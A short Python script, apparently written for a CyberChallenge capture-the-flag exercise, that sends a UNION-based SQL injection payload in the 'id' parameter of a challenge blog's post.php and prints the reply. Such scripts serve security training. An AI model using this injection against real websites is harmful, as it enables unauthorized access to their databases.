import requests

ENDPOINT = "http://yetanotherblog.challs.cyberchallenge.it/post.php"

r = requests.get(ENDPOINT, params={"id": "' UNION SELECT 1,2,3 -- "})
r.raise_for_status()

print(r.text)